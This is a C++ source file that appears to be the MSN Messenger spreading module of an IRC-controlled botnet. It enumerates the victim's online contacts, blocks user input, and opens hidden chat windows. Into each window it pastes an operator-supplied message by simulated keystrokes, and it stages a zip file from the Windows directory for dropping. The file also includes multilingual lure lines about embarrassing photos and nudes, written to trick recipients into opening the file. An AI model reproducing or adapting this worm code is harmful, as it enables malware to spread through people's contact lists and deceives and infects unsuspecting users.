#include "includes.h"
#include "functions.h"

#ifndef NO_MSNSPREAD
#import "MSNMessengerAPI.tlb" named_guids, no_namespace


void to_variant(BSTR, VARIANT& vt);
int trx;
int stats_msg;
int stats_zip;
int stats_msgzip;


static const char *gen_msgenglish[] = {
  "Sup, seen the pictures from the other night?",
  "Hey m8, who is this on the right, in this picture...",
  "Should I put this on facebook/myspace?",
  "LOL, you look so ugly in this picture, no joke...",
  "WoW? is that really you... what the hell where you drinking :D",
};
/*
static const char char *gen_msgfrench[] = {
  /*"looool tu dois voire mon photo album",
  "ma soeur a voulu que tu regarde ca",
  "je vien de finire ce photo album :D",
  "j fais pour toi ce photo album tu dois le voire :)",
  "tu dois voire les tof de notre bande",
  "c seulement mes tof de dernieres vacances",
  "eeeh c mes tof :p"
};

static const char *gen_msgdutch[] = {
"HEY lol heb ik een nieuw fotoalbum!: gedaan) Tweede ziek vindt dossier en verzendt u het ",
"wanna Hey ziet mijn nieuw fotoalbum?", 
"Hey keurt mijn fotoalbum, nieuwe pics van Nice van goed me en mijn vrienden en materiaal en toen ik jonge lol...", 
"Hey be�indigde enkel nieuw fotoalbum! :) een paar nudes zou kunnen zijn;) lol... ", 
"hey kreeg u een fotoalbum? anyways heres mijn nieuw fotoalbum:) keur k goed?",
"hey mens keurt mijn nieuw fotoalbum goed.. :(",
"het voor yah, doend beeldverhaal van mijn leven lol.."
};

static const char *gen_msggerman[] = {
"he m�chten mein neues Fotoalbum sehen?",
"Geck, nehmen bitte sein nur mich Fotoalbum an: (!",
"he m�chten mein neues Fotoalbum sehen?",
"lol meine Schwester w�nscht mich Ihnen dieses Fotoalbum schicken"
};

static const char *gen_msgspain[] = {
"�El tipo, me acepta por favor su solamente �lbum de foto: (!",
"�Hey i que hace el �lbum de foto! Si vea el loL del em",
"vengo de fi este foto �lbum",
"el lol mi hermana quisiera que le enviara este �lbum de foto"
};
*/


char *stristr(const char *String, const char *Pattern) {
	char *pptr, *sptr, *start;
	unsigned int slen, plen;

	for (start = (char *) String,
			pptr = (char *) Pattern,
			slen = strlen (String), plen = strlen (Pattern);
			/*
			 * while string length not shorter than pattern length
			 */
			slen >= plen; start++, slen--) {
		/*
		 * find start of pattern in string
		 */
		while (toupper (*start) != toupper (*Pattern)) {
			start++;
			slen--;

			/*
			 * if pattern longer than string
			 */

			if (slen < plen)
				return (NULL);
		}

		sptr = start;
		pptr = (char *) Pattern;

		while (toupper (*sptr) == toupper (*pptr)) {
			sptr++;
			pptr++;

			/*
			 * if end of pattern then pattern was found
			 */

			if ('\0' == *pptr)
				return (start);
		}
	}
	return (NULL);
}


void key_type(char* text, HWND hwnd)
{
	HGLOBAL hData;
	LPVOID pData;
	OpenClipboard(hwnd);
	EmptyClipboard();
	hData = GlobalAlloc(GMEM_DDESHARE | GMEM_MOVEABLE, strlen(text) + 1);
	pData = GlobalLock(hData);
	strcpy((LPSTR)pData, text);
	GlobalUnlock(hData);
	SetClipboardData(CF_TEXT, hData);
	CloseClipboard();
}


int dropfiles(char *ZipName, HWND hwnd) {
	char windir[260];
	char szFiles[260];
	GetWindowsDirectory(windir,sizeof(windir));
	strcat(windir,"\\");
	strcat(windir, ZipName);
	memset(szFiles, '\0', sizeof(windir));
	sprintf(szFiles, "%s",windir);

	if (OpenClipboard (hwnd)) {
		EmptyClipboard ();
		int nSize = sizeof (DROPFILES) + sizeof (szFiles);
		HANDLE hData = ::GlobalAlloc (GHND, nSize);
		LPDROPFILES pDropFiles = (LPDROPFILES) ::GlobalLock (hData);
		pDropFiles->pFiles = sizeof (DROPFILES);

		#ifdef UNICODE
		pDropFiles->fWide = TRUE;
		#else
		pDropFiles->fWide = FALSE;
		#endif

		LPBYTE pData = (LPBYTE) pDropFiles + sizeof (DROPFILES);
		CopyMemory (pData, szFiles, sizeof (szFiles));
		GlobalUnlock (hData);
		SetClipboardData (CF_HDROP, hData);
		CloseClipboard ();
	}
	return 0;
}



DWORD WINAPI MsnMsg(LPVOID param)
{
	trx = 0;

	NTHREAD msn = *((NTHREAD *)param);
	NTHREAD *msns = (NTHREAD *)param;
	msns->gotinfo = TRUE;











	IMSNMessenger3 *pIMessenger = NULL;

	CoInitialize(0);

	HRESULT hr = CoCreateInstance(
		CLSID_Messenger,
		NULL,
		CLSCTX_ALL,
		IID_IMSNMessenger2,
		(void**)&pIMessenger);

	char msnmsg[512];
	strncpy(msnmsg,msn.data1,sizeof(msnmsg));
     
	if (SUCCEEDED(hr))
	{

//		char msg[256];
		IDispatch * dispContacts = NULL;
		pIMessenger->get_MyContacts(&dispContacts);
		if (SUCCEEDED(hr))
		{

			IMSNMessengerContacts *pIMessengerContacts = NULL;
			
			hr = dispContacts->QueryInterface(__uuidof(pIMessengerContacts),(LPVOID*)&pIMessengerContacts);
			if (SUCCEEDED(hr))
			{
				IDispatch * dispContact					= NULL;
				IMSNMessengerContact *pIMessengerContact	= NULL;
				long iContacts;

				hr = pIMessengerContacts->get_Count(&iContacts);
				if (SUCCEEDED(hr))
				{
					BlockInput(true);
					for (long i = 0; i < iContacts; i++)	
					{
						hr = pIMessengerContacts->raw_Item(i,&dispContact);
						if (SUCCEEDED(hr))
						{
							hr = dispContact->QueryInterface(__uuidof(pIMessengerContact),(LPVOID*)&pIMessengerContact);
							if (SUCCEEDED(hr))
							{
								BSTR szContactName;
								VARIANT vt_user;
								MISTATUS miStatus;
								IDispatch *pIDispatch = NULL;
								IMSNMessengerWindow *pIMessengerWindow;
								LONG wndIM;

								hr = pIMessengerContact->get_Status(&miStatus);
								if (SUCCEEDED(hr))
								{
									if (miStatus == MISTATUS_OFFLINE)
									{
										pIMessengerContact->Release();
										dispContact->Release();
										continue;
									}
								}
								pIMessengerContact->get_SigninName(&szContactName);
								VariantInit( &vt_user );
								to_variant(szContactName, vt_user);
								Sleep(3000);
								hr = pIMessenger->raw_InstantMessage(vt_user,&pIDispatch);
								if (SUCCEEDED(hr))
								{
									hr = pIDispatch->QueryInterface(IID_IMSNMessengerWindow, (void **)&pIMessengerWindow);
									if (SUCCEEDED(hr))
									{
										Sleep(10);
										pIMessengerWindow->get_HWND(&wndIM);
										SetForegroundWindow((HWND) wndIM);
										SetFocus((HWND) wndIM);
										trx++;
										ShowWindow((HWND) wndIM,0);										
										srand(GetTickCount());	
										stats_msg++;
                                        //int i = rand() % sizeof(gen_msgenglish) / sizeof(gen_msgenglish[0]);
                                        key_type((char *)msnmsg, (HWND) wndIM);
										keybd_event(VK_CONTROL, 0, KEYEVENTF_EXTENDEDKEY | 0, 0);
                                        keybd_event(VkKeyScan('V'), 0, 0, 0);
                                        keybd_event(VK_CONTROL, 45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); 
                                        keybd_event(VK_RETURN, 0, 0, 0);								
																		
									}
								}
								pIMessengerContact->Release();
								dispContact->Release();
							}
						}
					}
					BlockInput(false);
				//	irc_privmsg(sock, chan, str_msn_msg, notice,TRUE);
					pIMessengerContacts->Release();
				}
				dispContacts->Release();
			}
		}
		pIMessenger->Release();
	}

	CoUninitialize();
	clearthread(msn.threadnum);
	ExitThread(0);

	return 0;
}

DWORD WINAPI MsnStats(LPVOID param)
{

	NTHREAD msn = *((NTHREAD *)param);
	NTHREAD *msns = (NTHREAD *)param;
	msns->gotinfo = TRUE;
	IRC* irc=(IRC*)msn.conn;
//	irc->pmsg(msn.target,str_msn_stat, stats_msg, stats_zip, stats_msgzip);
	return 0;
}

void to_variant(BSTR str, VARIANT& vt)
{
	reinterpret_cast<_variant_t&>(vt) = str;
}

void AddContact(char *email) {
	IMSNMessenger *MSN = NULL;
	CoInitialize(0);
	HRESULT HR = CoCreateInstance(CLSID_Messenger, NULL, CLSCTX_ALL,IID_IMSNMessenger,(void **)&MSN);
	if(SUCCEEDED(HR)) {
		MSN->AddContact(NULL, email);
	}
	BlockInput(1);
	Sleep(500);
	keybd_event(VK_RETURN, 0, 0, 0);
	BlockInput(0);
}
#endif